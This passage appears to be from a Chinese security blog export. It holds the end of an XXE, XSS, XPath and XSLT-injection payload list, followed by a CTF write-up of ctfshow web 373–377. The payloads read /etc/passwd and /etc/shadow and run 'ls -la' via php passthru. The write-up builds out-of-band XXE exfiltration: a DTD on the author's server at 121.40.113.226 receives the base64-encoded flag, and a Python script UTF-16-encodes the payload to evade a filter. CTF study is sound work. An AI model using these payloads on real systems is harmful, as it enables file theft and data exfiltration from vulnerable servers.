<span class="meta-keyword">xxe</span> <span class="meta-keyword">SYSTEM</span> <span class="meta-string">&quot;file:///c:/boot.ini&quot;</span> &gt;</span>]&gt;</span></span><br><span class="line"><span class="meta">&lt;?xml version=&quot;1.0&quot; encoding=&quot;ISO-8859-1&quot;?&gt;</span><span class="meta">&lt;!DOCTYPE <span class="meta-keyword">foo</span> [<span class="meta">&lt;!ELEMENT <span class="meta-keyword">foo</span> <span class="meta-keyword">ANY</span> &gt;</span><span class="meta">&lt;!ENTITY <span class="meta-keyword">xxe</span> <span class="meta-keyword">SYSTEM</span> <span class="meta-string">&quot;http://example.com:80&quot;</span> &gt;</span>]&gt;</span><span class="tag">&lt;<span class="name">foo</span>&gt;</span><span class="symbol">&amp;xxe;</span><span class="tag">&lt;/<span class="name">foo</span>&gt;</span></span><br><span class="line"><span class="meta">&lt;?xml version=&quot;1.0&quot; encoding=&quot;ISO-8859-1&quot;?&gt;</span><span class="meta">&lt;!DOCTYPE <span class="meta-keyword">foo</span> [<span class="meta">&lt;!ELEMENT <span class="meta-keyword">foo</span> <span class="meta-keyword">ANY</span> &gt;</span><span class="meta">&lt;!ENTITY <span class="meta-keyword">xxe</span> <span class="meta-keyword">SYSTEM</span> <span class="meta-string">&quot;http://example:443&quot;</span> &gt;</span>]&gt;</span></span><br><span class="line"><span class="meta">&lt;?xml version=&quot;1.0&quot; encoding=&quot;ISO-8859-1&quot;?&gt;</span><span class="meta">&lt;!DOCTYPE <span class="meta-keyword">foo</span> [<span class="meta">&lt;!ELEMENT <span class="meta-keyword">foo</span> <span class="meta-keyword">ANY</span>&gt;</span><span class="meta">&lt;!ENTITY <span class="meta-keyword">xxe</span> <span class="meta-keyword">SYSTEM</span> <span class="meta-string">&quot;file:////dev/random&quot;</span>&gt;</span>]&gt;</span><span class="tag">&lt;<span class="name">foo</span>&gt;</span><span class="symbol">&amp;xxe;</span><span class="tag">&lt;/<span class="name">foo</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">test</span>&gt;</span><span class="tag">&lt;/<span class="name">test</span>&gt;</span></span><br><span class="line">&lt;![CDATA[&lt;test&gt;&lt;/test&gt;]]&gt;</span><br><span class="line"><span class="symbol">&amp;foo;</span></span><br><span class="line">%foo;</span><br><span class="line">count(/child::node())</span><br><span class="line">x&#x27; or name()=&#x27;username&#x27; or &#x27;x&#x27;=&#x27;y</span><br><span class="line"><span class="tag">&lt;<span class="name">name</span>&gt;</span>&#x27;,&#x27;&#x27;)); phpinfo(); exit;/*<span class="tag">&lt;/<span class="name">name</span>&gt;</span></span><br><span class="line">&lt;![CDATA[&lt;script&gt;var n=0;while(true)&#123;n++;&#125;&lt;/script&gt;]]&gt;</span><br><span class="line">&lt;![CDATA[&lt;]]&gt;SCRIPT&lt;![CDATA[&gt;]]&gt;alert(&#x27;XSS&#x27;);&lt;![CDATA[&lt;]]&gt;/SCRIPT&lt;![CDATA[&gt;]]&gt;</span><br><span class="line"><span class="meta">&lt;?xml version=&quot;1.0&quot; encoding=&quot;ISO-8859-1&quot;?&gt;</span><span class="tag">&lt;<span class="name">foo</span>&gt;</span>&lt;![CDATA[&lt;]]&gt;SCRIPT&lt;![CDATA[&gt;]]&gt;alert(&#x27;XSS&#x27;);&lt;![CDATA[&lt;]]&gt;/SCRIPT&lt;![CDATA[&gt;]]&gt;<span class="tag">&lt;/<span class="name">foo</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">foo</span>&gt;</span>&lt;![CDATA[&lt;]]&gt;SCRIPT&lt;![CDATA[&gt;]]&gt;alert(&#x27;XSS&#x27;);&lt;![CDATA[&lt;]]&gt;/SCRIPT&lt;![CDATA[&gt;]]&gt;<span class="tag">&lt;/<span class="name">foo</span>&gt;</span></span><br><span class="line"><span class="meta">&lt;?xml version=&quot;1.0&quot; encoding=&quot;ISO-8859-1&quot;?&gt;</span><span class="tag">&lt;<span class="name">foo</span>&gt;</span>&lt;![CDATA[&#x27; or 1=1 or &#x27;&#x27;=&#x27;]]&gt;<span class="tag">&lt;/<span class="name">foo</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">foo</span>&gt;</span>&lt;![CDATA[&#x27; or 1=1 or &#x27;&#x27;=&#x27;]]&gt;<span class="tag">&lt;/<span class="name">foo</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">xml</span> <span class="attr">ID</span>=<span class="string">I</span>&gt;</span><span class="tag">&lt;<span class="name">X</span>&gt;</span><span class="tag">&lt;<span class="name">C</span>&gt;</span>&lt;![CDATA[&lt;IMG SRC=&quot;javas]]&gt;&lt;![CDATA[cript:alert(&#x27;XSS&#x27;);&quot;&gt;]]&gt;</span><br><span class="line"><span class="tag">&lt;<span class="name">xml</span> <span class="attr">ID</span>=<span class="string">&quot;xss&quot;</span>&gt;</span><span class="tag">&lt;<span class="name">I</span>&gt;</span><span class="tag">&lt;<span class="name">B</span>&gt;</span><span class="symbol">&amp;lt;</span>IMG SRC=&quot;javas<span class="comment">&lt;!-- --&gt;</span>cript:alert(&#x27;XSS&#x27;)&quot;<span class="symbol">&amp;gt;</span><span class="tag">&lt;/<span class="name">B</span>&gt;</span><span class="tag">&lt;/<span class="name">I</span>&gt;</span><span class="tag">&lt;/<span class="name">xml</span>&gt;</span><span class="tag">&lt;<span class="name">SPAN</span> <span class="attr">DATASRC</span>=<span class="string">&quot;#xss&quot;</span> <span class="attr">DATAFLD</span>=<span class="string">&quot;B&quot;</span> <span class="attr">DATAFORMATAS</span>=<span class="string">&quot;HTML&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">SPAN</span>&gt;</span><span class="tag">&lt;/<span class="name">C</span>&gt;</span><span class="tag">&lt;/<span class="name">X</span>&gt;</span><span class="tag">&lt;/<span class="name">xml</span>&gt;</span><span class="tag">&lt;<span class="name">SPAN</span> <span class="attr">DATASRC</span>=<span class="string">#I</span> <span class="attr">DATAFLD</span>=<span class="string">C</span> <span class="attr">DATAFORMATAS</span>=<span class="string">HTML</span>&gt;</span><span class="tag">&lt;/<span class="name">SPAN</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">xml</span> <span class="attr">SRC</span>=<span class="string">&quot;xsstest.xml&quot;</span> <span class="attr">ID</span>=<span class="string">I</span>&gt;</span><span class="tag">&lt;/<span class="name">xml</span>&gt;</span><span class="tag">&lt;<span class="name">SPAN</span> <span class="attr">DATASRC</span>=<span class="string">#I</span> <span class="attr">DATAFLD</span>=<span class="string">C</span> <span class="attr">DATAFORMATAS</span>=<span class="string">HTML</span>&gt;</span><span class="tag">&lt;/<span class="name">SPAN</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">SPAN</span> <span class="attr">DATASRC</span>=<span class="string">#I</span> <span class="attr">DATAFLD</span>=<span class="string">C</span> <span class="attr">DATAFORMATAS</span>=<span class="string">HTML</span>&gt;</span><span class="tag">&lt;/<span class="name">SPAN</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">xml</span> <span class="attr">SRC</span>=<span class="string">&quot;xsstest.xml&quot;</span> <span class="attr">ID</span>=<span class="string">I</span>&gt;</span><span class="tag">&lt;/<span class="name">xml</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">HTML</span> <span class="attr">xmlns:xss</span>&gt;</span>&lt;?import namespace=&quot;xss&quot; implementation=&quot;http://ha.ckers.org/xss.htc&quot;&gt;<span class="tag">&lt;<span class="name">xss:xss</span>&gt;</span>XSS<span class="tag">&lt;/<span class="name">xss:xss</span>&gt;</span><span class="tag">&lt;/<span class="name">HTML</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">HTML</span> <span class="attr">xmlns:xss</span>&gt;</span>&lt;?import namespace=&quot;xss&quot; implementation=&quot;http://ha.ckers.org/xss.htc&quot;&gt;</span><br><span class="line"><span class="tag">&lt;<span class="name">xsl:stylesheet</span> <span class="attr">version</span>=<span class="string">&quot;1.0&quot;</span> <span class="attr">xmlns:xsl</span>=<span class="string">&quot;http://www.w3.org/1999/XSL/Transform&quot;</span> <span class="attr">xmlns:php</span>=<span class="string">&quot;http://php.net/xsl&quot;</span>&gt;</span><span class="tag">&lt;<span class="name">xsl:template</span> <span class="attr">match</span>=<span class="string">&quot;/&quot;</span>&gt;</span><span class="tag">&lt;<span class="name">script</span>&gt;</span>alert(123)<span class="tag">&lt;/<span class="name">script</span>&gt;</span><span class="tag">&lt;/<span class="name">xsl:template</span>&gt;</span><span class="tag">&lt;/<span class="name">xsl:stylesheet</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">xsl:stylesheet</span> <span class="attr">version</span>=<span class="string">&quot;1.0&quot;</span> <span class="attr">xmlns:xsl</span>=<span class="string">&quot;http://www.w3.org/1999/XSL/Transform&quot;</span> <span class="attr">xmlns:php</span>=<span class="string">&quot;http://php.net/xsl&quot;</span>&gt;</span><span class="tag">&lt;<span class="name">xsl:template</span> <span class="attr">match</span>=<span class="string">&quot;/&quot;</span>&gt;</span><span class="tag">&lt;<span class="name">xsl:copy-of</span> <span class="attr">select</span>=<span class="string">&quot;document(&#x27;/etc/passwd&#x27;)&quot;</span>/&gt;</span><span class="tag">&lt;/<span class="name">xsl:template</span>&gt;</span><span class="tag">&lt;/<span class="name">xsl:stylesheet</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">xsl:stylesheet</span> <span class="attr">version</span>=<span class="string">&quot;1.0&quot;</span> <span class="attr">xmlns:xsl</span>=<span class="string">&quot;http://www.w3.org/1999/XSL/Transform&quot;</span> <span class="attr">xmlns:php</span>=<span class="string">&quot;http://php.net/xsl&quot;</span>&gt;</span><span class="tag">&lt;<span class="name">xsl:template</span> <span class="attr">match</span>=<span class="string">&quot;/&quot;</span>&gt;</span><span class="tag">&lt;<span class="name">xsl:value-of</span> <span class="attr">select</span>=<span class="string">&quot;php:function(&#x27;passthru&#x27;,&#x27;ls -la&#x27;)&quot;</span>/&gt;</span><span class="tag">&lt;/<span class="name">xsl:template</span>&gt;</span><span class="tag">&lt;/<span class="name">xsl:stylesheet</span>&gt;</span></span><br><span class="line"><span class="meta">&lt;!DOCTYPE <span class="meta-keyword">foo</span> [<span class="meta">&lt;!ELEMENT <span class="meta-keyword">foo</span> <span class="meta-keyword">ANY</span> &gt;</span><span class="meta">&lt;!ENTITY <span class="meta-keyword">xxe</span> <span class="meta-keyword">SYSTEM</span> <span class="meta-string">&quot;file:///etc/passwd&quot;</span> &gt;</span>]&gt;</span></span><br><span class="line"><span class="meta">&lt;!DOCTYPE <span class="meta-keyword">foo</span> [<span class="meta">&lt;!ELEMENT <span class="meta-keyword">foo</span> <span class="meta-keyword">ANY</span> &gt;</span><span class="meta">&lt;!ENTITY <span class="meta-keyword">xxe</span> <span class="meta-keyword">SYSTEM</span> <span class="meta-string">&quot;file:///etc/shadow&quot;</span> &gt;</span>]&gt;</span></span><br><span class="line"><span class="meta">&lt;!DOCTYPE <span class="meta-keyword">foo</span> [<span class="meta">&lt;!ELEMENT <span class="meta-keyword">foo</span> <span class="meta-keyword">ANY</span> &gt;</span><span class="meta">&lt;!ENTITY <span class="meta-keyword">xxe</span> <span class="meta-keyword">SYSTEM</span> <span class="meta-string">&quot;file:///c:/boot.ini&quot;</span> &gt;</span>]&gt;</span></span><br><span class="line"><span class="meta">&lt;!DOCTYPE <span class="meta-keyword">foo</span> [<span class="meta">&lt;!ELEMENT <span class="meta-keyword">foo</span> <span class="meta-keyword">ANY</span> &gt;</span><span class="meta">&lt;!ENTITY <span class="meta-keyword">xxe</span> <span class="meta-keyword">SYSTEM</span> <span class="meta-string">&quot;http://example.com/text.txt&quot;</span> &gt;</span>]&gt;</span></span><br><span class="line"><span class="meta">&lt;!DOCTYPE <span class="meta-keyword">foo</span> [<span class="meta">&lt;!ELEMENT <span class="meta-keyword">foo</span> <span class="meta-keyword">ANY</span>&gt;</span><span class="meta">&lt;!ENTITY <span class="meta-keyword">xxe</span> <span class="meta-keyword">SYSTEM</span> <span class="meta-string">&quot;file:////dev/random&quot;</span>&gt;</span>]&gt;</span></span><br><span class="line"><span class="meta">&lt;!ENTITY % <span class="meta-keyword">int</span> <span class="meta-string">&quot;&lt;!ENTITY &amp;#37; trick SYSTEM &#x27;http://127.0.0.1:80/?%file;&#x27;&gt;  &quot;</span>&gt;</span> %int;</span><br><span class="line"><span class="meta">&lt;!DOCTYPE <span class="meta-keyword">xxe</span> [ <span class="meta">&lt;!ENTITY % <span class="meta-keyword">file</span> <span class="meta-keyword">SYSTEM</span> <span class="meta-string">&quot;file:///etc/issue&quot;</span>&gt;</span><span class="meta">&lt;!ENTITY % <span class="meta-keyword">dtd</span> <span class="meta-keyword">SYSTEM</span> <span class="meta-string">&quot;http://example.com/evil.dtd&quot;</span>&gt;</span>%dtd;%trick;]&gt;</span></span><br><span class="line"><span class="meta">&lt;!DOCTYPE <span class="meta-keyword">xxe</span> [ <span class="meta">&lt;!ENTITY % <span class="meta-keyword">file</span> <span class="meta-keyword">SYSTEM</span> <span class="meta-string">&quot;file:///c:/boot.ini&quot;</span>&gt;</span><span class="meta">&lt;!ENTITY % <span class="meta-keyword">dtd</span> <span class="meta-keyword">SYSTEM</span> <span class="meta-string">&quot;http://example.com/evil.dtd&quot;</span>&gt;</span>%dtd;%trick;]&gt;</span></span><br></pre></td></tr></table></figure>

]]></content>
      <categories>
        <category>web基础</category>
      </categories>
      <tags>
        <tag>xxe</tag>
      </tags>
  </entry>
  <entry>
    <title>xxe题目</title>
    <url>/2021/12/25/xxe%E9%A2%98%E7%9B%AE/</url>
    <content><![CDATA[<h2 id="ctfshow"><a href="#ctfshow" class="headerlink" title="ctfshow"></a>ctfshow</h2><h3 id="ctfshow-web-373"><a href="#ctfshow-web-373" class="headerlink" title="ctfshow web 373"></a>ctfshow web 373</h3><p>php://input</p>
<p>从官网信息来看，php://input是一个只读信息流，当请求方式是post的，并且enctype不等于”multipart/form-data”时，可以使用php://input来获取原始请求的数据。</p>
<p>数据包中反倒是不管是get还是post,php://input都会<label style="color:red">读取post类型数据包中变量位置</label>的数据(就是header头空一行下面的数据)</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">error_reporting(<span class="number">0</span>);</span><br><span class="line">libxml_disable_entity_loader(<span class="literal">false</span>);<span class="comment">//设置为false则允许外部实体加载</span></span><br><span class="line"><span class="variable">$xmlfile</span> = file_get_contents(<span class="string">&#x27;php://input&#x27;</span>);<span class="comment">//将获取到的数据包内容转换成字符串</span></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$xmlfile</span>))&#123;</span><br><span class="line">    <span class="variable">$dom</span> = <span class="keyword">new</span> DOMDocument();</span><br><span class="line">    <span class="variable">$dom</span>-&gt;loadXML(<span class="variable">$xmlfile</span>, LIBXML_NOENT | LIBXML_DTDLOAD);<span class="comment">//LIBXML_NOENT 该标志允许替换XML字符实体引用(无论是否外部)也就是允许 &amp;a; 这样的写法</span></span><br><span class="line">    <span class="variable">$creds</span> = simplexml_import_dom(<span class="variable">$dom</span>);<span class="comment">//把 DOM 节点转换为 SimpleXMLElement 对象。</span></span><br><span class="line">    <span class="variable">$ctfshow</span> = <span class="variable">$creds</span>-&gt;ctfshow;<span class="comment">//找到里面的ctfshow标签</span></span><br><span class="line">    <span class="keyword">echo</span> <span class="variable">$ctfshow</span>;<span class="comment">//输出ctfshow标签的内容</span></span><br><span class="line">&#125;</span><br><span class="line">highlight_file(<span class="keyword">__FILE__</span>);    </span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>综合上面的分析,得知只需要将ctfshow标签中的内容设置成想要的内容即可,但是不能直接将ctfshow设置为根标签,在外部随便加一个标签就行</p>
<h5 id="payload"><a href="#payload" class="headerlink" title="payload"></a>payload</h5><figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?xml version=&quot;1.0&quot;?&gt;</span></span><br><span class="line"><span class="meta">&lt;!DOCTYPE <span class="meta-keyword">test</span> [</span></span><br><span class="line"><span class="meta"><span class="meta">&lt;!ENTITY <span class="meta-keyword">xxe</span> <span class="meta-keyword">SYSTEM</span> <span class="meta-string">&quot;file:///flag&quot;</span>&gt;</span></span></span><br><span class="line"><span class="meta">]&gt;</span></span><br><span class="line">//上面为内部dtd文档</span><br><span class="line"><span class="tag">&lt;<span class="name">neo</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">ctfshow</span>&gt;</span><span class="symbol">&amp;xxe;</span><span class="tag">&lt;/<span class="name">ctfshow</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">neo</span>&gt;</span></span><br></pre></td></tr></table></figure>

<h3 id="ctfshow-web-374"><a href="#ctfshow-web-374" class="headerlink" title="ctfshow web 374"></a>ctfshow web 374</h3><p>本题没有回显,需要使用外带dtd</p>
<p>利用python在云服务器搭建一个http服务器,并保持监听</p>
<p><code>python3 -m http.server 5555</code></p>
<p>题目代码</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">error_reporting(<span class="number">0</span>);</span><br><span class="line">libxml_disable_entity_loader(<span class="literal">false</span>);</span><br><span class="line"><span class="variable">$xmlfile</span> = file_get_contents(<span class="string">&#x27;php://input&#x27;</span>);</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$xmlfile</span>))&#123;</span><br><span class="line">    <span class="variable">$dom</span> = <span class="keyword">new</span> DOMDocument();</span><br><span class="line">    <span class="variable">$dom</span>-&gt;loadXML(<span class="variable">$xmlfile</span>, LIBXML_NOENT | LIBXML_DTDLOAD);</span><br><span class="line">&#125;</span><br><span class="line">highlight_file(<span class="keyword">__FILE__</span>);    </span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>本题有个疑问,就是为什么要使用php伪协议,突然想到本题没有回显,结合做过的文件包含题目,只有采用php伪协议才能读取到源码,就算是将文件包含进去了,也是执行代码,代码中不做输出,页面就不会显示输出</p>
<p>起初这样写了dtd文档</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;!ENTITY % b SYSTEM &quot;http://121.40.113.226:5555/php://filter/read=convert.base64-encode/resource=/flag&quot;&gt;</span><br><span class="line">%b;</span><br></pre></td></tr></table></figure>

<p>xml</p>
<figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?xml version=&quot;1.0&quot;?&gt;</span></span><br><span class="line"><span class="meta">&lt;!DOCTYPE a[</span></span><br><span class="line"><span class="meta">	<span class="meta">&lt;!ENTITY % <span class="meta-keyword">xxe</span> <span class="meta-keyword">SYSTEM</span> <span class="meta-string">&quot;http://121.40.113.226:5555/Python-3.8.3/payload_xml/oob.dtd&quot;</span>&gt;</span></span></span><br><span class="line"><span class="meta">	%xxe;</span></span><br><span class="line"><span class="meta"></span></span><br><span class="line"><span class="meta">]&gt;</span></span><br></pre></td></tr></table></figure>

<p>服务端给了这样的回显,说明是没有使用php协议,当成了路径,仔细一想,应该使用另一个实体来替换后面的伪协议内容</p>
<p><img src="https://picture-1304716932.cos.ap-chengdu.myqcloud.com/img/image-20220110180025568.png" alt="image-20220110180025568"></p>
<p> 更改后的dtd文档</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;!ENTITY % file SYSTEM &quot;php://filter/read=convert.base64-encode/resource=/flag&quot;&gt;</span><br><span class="line">&lt;!ENTITY % b SYSTEM &quot;http://121.40.113.226:5555/%file;&quot;&gt;</span><br><span class="line">%b;</span><br></pre></td></tr></table></figure>

<p>这次服务端回显了200,说明有成功请求到dtd文档,但是忘了一个问题,这里的file变量需要读取的内容在靶机上,而我这样写就是读取攻击机的内容了……</p>
<p><img src="https://picture-1304716932.cos.ap-chengdu.myqcloud.com/img/image-20220110180342295.png" alt="image-20220110180342295"></p>
<p>查看了别人写的payload,明白了基本原理:利用xml的变量机制,把请求路径转换成通过base64编码的文件内容,所以得到的返回值是404</p>
<p><img src="https://picture-1304716932.cos.ap-chengdu.myqcloud.com/img/image-20220110182024289.png" alt="image-20220110182024289"></p>
<h5 id="payload-1"><a href="#payload-1" class="headerlink" title="payload"></a>payload</h5><p>xml</p>
<p>xml通过前面的尝试已经完全理解了</p>
<figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;!DOCTYPE <span class="meta-keyword">test</span> [</span></span><br><span class="line"><span class="meta"><span class="meta">&lt;!ENTITY % <span class="meta-keyword">file</span> <span class="meta-keyword">SYSTEM</span> <span class="meta-string">&quot;php://filter/read=convert.base64-encode/resource=/flag&quot;</span>&gt;</span></span></span><br><span class="line"><span class="meta"><span class="meta">&lt;!ENTITY % <span class="meta-keyword">aaa</span> <span class="meta-keyword">SYSTEM</span> <span class="meta-string">&quot;http://121.40.113.226:5555/Python-3.8.3/payload_xml/oob.dtd&quot;</span>&gt;</span></span></span><br><span class="line"><span class="meta">%aaa;</span></span><br><span class="line"><span class="meta">]&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">test</span>&gt;</span>123<span class="tag">&lt;/<span class="name">test</span>&gt;</span></span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>dtd</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;!ENTITY % dtd &quot;&lt;!ENTITY &amp;#x25; xxe  SYSTEM &#x27;http://121.40.113.226:5555/%file;&#x27;&gt; &quot;&gt;</span><br><span class="line">%dtd;</span><br><span class="line">%xxe;</span><br></pre></td></tr></table></figure>

<p>有两个问题,</p>
<p>第一个就是为什么要将%进行编码为<code>&amp;#x25;</code>,我的理解是实体里面包含实体因为引号的原因,需要将其进行编码,我又进行了尝试,将第一个%也编码成<code>&amp;#x25;</code>,未成功</p>
<p>第二个是为什么要实体里面包含实体,不能直接执行</p>
<p><code>&lt;!ENTITY % xxe  SYSTEM &quot;http://121.40.113.226:5555/%file;&quot;&gt;  %xxe;</code></p>
<p>但是如果写成这样,请求的路径就还是dtd文档了<img src="https://picture-1304716932.cos.ap-chengdu.myqcloud.com/img/image-20220110183234994.png" alt="image-20220110183234994"></p>
<p>在尝试中一个偶然的错误让我有了启发,—-我忘记给dtd中的url加端口了</p>
<p><img src="https://picture-1304716932.cos.ap-chengdu.myqcloud.com/img/image-20220110183404676.png" alt="image-20220110183404676"></p>
<p><img src="https://picture-1304716932.cos.ap-chengdu.myqcloud.com/img/image-20220110183422805.png" alt="image-20220110183422805"></p>
<p>此时的请求路径还是dtd文档,那也就是说,之前所有请求文档的都是因为%aaa和dtd文档的错误书写</p>
<p><img src="https://picture-1304716932.cos.ap-chengdu.myqcloud.com/img/image-20220110183448490.png" alt="image-20220110183448490"></p>
<p>在dtd中如果颠倒%dtd和%xxe的顺序,请求路径还是dtd文档</p>
<p>突然看到用payload的时候请求信息是两条,</p>
<p><img src="https://picture-1304716932.cos.ap-chengdu.myqcloud.com/img/image-20220110185118318.png" alt="image-20220110185118318"></p>
<p>然后将dtd文档改成</p>
<p><code>&lt;!ENTITY % xxe  SYSTEM &#39;http://121.40.113.226:5555/1;&#39;&gt; %xxe;</code></p>
<p>请求路径还是两条</p>
<p><img src="https://picture-1304716932.cos.ap-chengdu.myqcloud.com/img/image-20220110185242294.png" alt="image-20220110185242294"></p>
<p>这个时候突然恍然大悟,为什么要用外部实体包裹它呢,是因为单个实体无法使用%file对路径进行替换,<laber style="color:red">真正发请求的还是%xxe</label>,用%dtd包裹它就可以使用%file对其进行替换,所以是先执行%dtd再执行%xxe</p>
<h3 id="ctfshow-web-375"><a href="#ctfshow-web-375" class="headerlink" title="ctfshow web 375"></a>ctfshow web 375</h3><p>题目代码</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">error_reporting(<span class="number">0</span>);</span><br><span class="line">libxml_disable_entity_loader(<span class="literal">false</span>);</span><br><span class="line"><span class="variable">$xmlfile</span> = file_get_contents(<span class="string">&#x27;php://input&#x27;</span>);</span><br><span class="line"><span class="keyword">if</span>(preg_match(<span class="string">&#x27;/&lt;\?xml version=&quot;1\.0&quot;/&#x27;</span>, <span class="variable">$xmlfile</span>))&#123;</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">&#x27;error&#x27;</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$xmlfile</span>))&#123;</span><br><span class="line">    <span class="variable">$dom</span> = <span class="keyword">new</span> DOMDocument();</span><br><span class="line">    <span class="variable">$dom</span>-&gt;loadXML(<span class="variable">$xmlfile</span>, LIBXML_NOENT | LIBXML_DTDLOAD);</span><br><span class="line">&#125;</span><br><span class="line">highlight_file(<span class="keyword">__FILE__</span>);    </span><br></pre></td></tr></table></figure>

<p>相较于374只是过滤了xml标签,但是没有xml对xml内容的读取没啥影响</p>
<h5 id="payload-2"><a href="#payload-2" class="headerlink" title="payload"></a>payload</h5><p>xml</p>
<figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;!DOCTYPE <span class="meta-keyword">test</span> [</span></span><br><span class="line"><span class="meta"><span class="meta">&lt;!ENTITY % <span class="meta-keyword">file</span> <span class="meta-keyword">SYSTEM</span> <span class="meta-string">&quot;php://filter/read=convert.base64-encode/resource=/flag&quot;</span>&gt;</span></span></span><br><span class="line"><span class="meta"><span class="meta">&lt;!ENTITY % <span class="meta-keyword">aaa</span> <span class="meta-keyword">SYSTEM</span> <span class="meta-string">&quot;http://121.40.113.226:5555/Python-3.8.3/payload_xml/oob.dtd&quot;</span>&gt;</span></span></span><br><span class="line"><span class="meta">%aaa;</span></span><br><span class="line"><span class="meta">]&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">test</span>&gt;</span>123<span class="tag">&lt;/<span class="name">test</span>&gt;</span></span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>dtd</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;!ENTITY % dtd &quot;&lt;!ENTITY &amp;#x25; xxe  SYSTEM &#x27;http://121.40.113.226:5555/%file;&#x27;&gt; &quot;&gt;</span><br><span class="line">%dtd;</span><br><span class="line">%xxe;</span><br></pre></td></tr></table></figure>

<h3 id="ctfshow-web-376"><a href="#ctfshow-web-376" class="headerlink" title="ctfshow web 376"></a>ctfshow web 376</h3><p>这题只是将正则转变成了不区分大小写,payload还是同上375题的</p>
<h3 id="ctfshow-web-377"><a href="#ctfshow-web-377" class="headerlink" title="ctfshow web 377"></a>ctfshow web 377</h3><p>题目代码</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">error_reporting(<span class="number">0</span>);</span><br><span class="line">libxml_disable_entity_loader(<span class="literal">false</span>);</span><br><span class="line"><span class="variable">$xmlfile</span> = file_get_contents(<span class="string">&#x27;php://input&#x27;</span>);</span><br><span class="line"><span class="keyword">if</span>(preg_match(<span class="string">&#x27;/&lt;\?xml version=&quot;1\.0&quot;|http/i&#x27;</span>, <span class="variable">$xmlfile</span>))&#123;</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">&#x27;error&#x27;</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$xmlfile</span>))&#123;</span><br><span class="line">    <span class="variable">$dom</span> = <span class="keyword">new</span> DOMDocument();</span><br><span class="line">    <span class="variable">$dom</span>-&gt;loadXML(<span class="variable">$xmlfile</span>, LIBXML_NOENT | LIBXML_DTDLOAD);</span><br><span class="line">&#125;</span><br><span class="line">highlight_file(<span class="keyword">__FILE__</span>);  </span><br></pre></td></tr></table></figure>

<p>本题对http关键字做了过滤,但是xml可以用utf16编码</p>
<h5 id="payload-3"><a href="#payload-3" class="headerlink" title="payload"></a>payload</h5><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line">payload=<span class="string">&quot;&quot;&quot;&lt;!DOCTYPE test [</span></span><br><span class="line"><span class="string">&lt;!ENTITY % file SYSTEM &quot;php://filter/read=convert.base64-encode/resource=/flag&quot;&gt;</span></span><br><span class="line"><span class="string">&lt;!ENTITY % aaa SYSTEM &quot;http://121.40.113.226:5555/Python-3.8.3/payload_xml/oob.dtd&quot;&gt;</span></span><br><span class="line"><span class="string">%aaa;</span></span><br><span class="line"><span class="string">]&gt;</span></span><br><span class="line"><span class="string">&lt;test&gt;123&lt;/test&gt;&quot;&quot;&quot;</span></span><br><span class="line">url=<span class="string">&quot;http://032b023b-084a-41ee-9c3e-2a3bec8669da.challenge.ctf.show&quot;</span></span><br><span class="line">requests.post(url=url,data=payload.encode(<span class="string">&quot;utf-16&quot;</span>))</span><br></pre></td></tr></table></figure>

<p>有个疑问:用web377用python转换成utf-16编码后post包用burp抓住后,里面还是包含http字符串的,咋就绕过了呢</p>
<p>这个是用burp抓的python发的包</p>
<p><img src="https://picture-1304716932.cos.ap-chengdu.myqcloud.com/img/image-20220110205856482.png" alt="image-20220110205856482"></p>
